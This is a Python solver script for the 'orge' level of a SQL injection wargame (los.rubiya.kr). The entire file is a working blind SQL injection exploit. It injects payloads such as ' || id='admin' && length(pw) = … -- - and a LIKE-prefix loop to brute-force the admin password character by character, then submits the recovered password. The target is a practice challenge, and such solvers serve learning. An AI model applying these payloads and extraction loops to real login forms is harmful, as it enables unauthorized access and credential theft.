import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"

pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' || id='admin' && pw like '{prefix}{c}%' -- -"))
        if hello_admin in res:
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 8
prefix = "7b751aec"

if pw_len is None:
    for i in range(40):
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' || id='admin' && length(pw) = {i} -- -"))
        if hello_admin in res:
            print("Found pw length:", i)
            pw_len = i
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
